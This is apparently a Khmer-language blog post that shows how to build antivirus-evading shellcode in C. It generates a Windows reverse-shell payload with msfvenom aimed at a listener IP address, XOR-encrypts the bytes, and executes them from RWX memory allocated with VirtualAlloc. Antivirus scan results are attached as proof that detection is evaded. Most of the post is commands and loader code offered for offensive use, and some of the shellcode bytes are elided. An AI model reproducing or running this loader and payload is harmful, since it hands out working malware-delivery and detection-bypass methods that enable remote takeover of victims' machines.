---
title: "Encrypting Shellcode with XOR In C"
date: 2023-06-30T21:01:06+07:00
description: កូដនីយកម្ម Shellcode ជាមួយ XOR ក្នុងភាសារ C
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- c-shellcode
- bypass
- xor
categories:
- Process Injection
series:
- WinExE
image: images/feature2/bam.png
---

#### Summary
ខាងក្រោមជាការបង្កើត Shellcode និងធ្វើកូដនីយកម្ម XOR ដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។

#### Generate Shellcode
ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។

{{< highlight zsh "linenos=table" >}}
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c
{{< / highlight >}}

#### Create XOR Encryption
{{< highlight c "linenos=table" >}}
#include <stdio.h>
unsigned char code[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x48\x3\xd2\x65\x48\[Original Shellcode]\x8b\x52\x18\x48"
"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";
int main()
{
 char key = 'K'; // RIGHT
 // char key = "K"; // WRONG
 int i = 0;
 for (i; i<sizeof(code); i++)
 {
  printf("\\x%02x",code[i]^key);
 }
}
{{< / highlight >}}

Compile កូដខាងលើនោះយើងនឹងទទួលបាន Encryption Strings ថ្មីមួយ សូមចម្លងវាទុកដើម្បីដាក់ចូលទៅក្នុងកូដខាងក្រោមដើម្បី Decrypt កូដខាងលើ ។

#### Create XOR Decryption
{{< highlight c "linenos=table" >}}
#include <stdio.h>
#include <windows.h>
unsigned char code[] = "\xb7\x03\xc8\xaf\[Decrypted Shellcode]\xa3\x87\x4b\x4b\x4b";
int main()
{
  char key = 'K';
  int i = 0;
  for (i; i<sizeof(code) - 1; i++)
{
  code[i] = code[i]^key;
}

  void *exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(exec, code, sizeof code);
  ((void(*)())exec)();
  return 0;
}
{{< / highlight >}}

Compile Payload ខាងលើនោះយើងនឹងទទួលបាន Payload ចុងក្រោយ ៕

![AV Scan Results](/en/posts/img/2023/06/shellcode-xor-encrypt-in-c/enc-dec-xor-demo.png)

#### Scan Result

![AV Scan Results](/en/posts/img/2023/06/shellcode-xor-encrypt-in-c/scan-results.png)

<b>តំណរភ្ជាប់៖</b> [ANTISCAN.ME](https://antiscan.me/scan/new/result?id=8fJpAqhnUN9c)
<b>សម្រង់ចេញពី៖</b> [MEDIUM](https://medium.com/@lsecqt/encrypting-shellcode-with-xor-offensive-coding-in-c-5a42cb978d6e)